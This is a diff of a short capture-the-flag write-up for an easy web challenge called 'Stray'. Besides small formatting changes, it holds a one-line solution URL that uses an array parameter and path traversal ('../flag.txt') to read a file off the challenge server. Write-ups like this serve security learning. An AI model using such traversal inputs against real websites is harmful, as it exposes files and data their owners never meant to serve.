@@ -1,7 +1,7 @@
 ### Challenge
-Name: Stray
-Category: web
-Difficulty: easy
+Name: Stray  
+Category: web  
+Difficulty: easy  
 
 ### Solution
 Enter the URL `https://stray.chall.pwnoh.io/cat?category[]=../flag.txt`
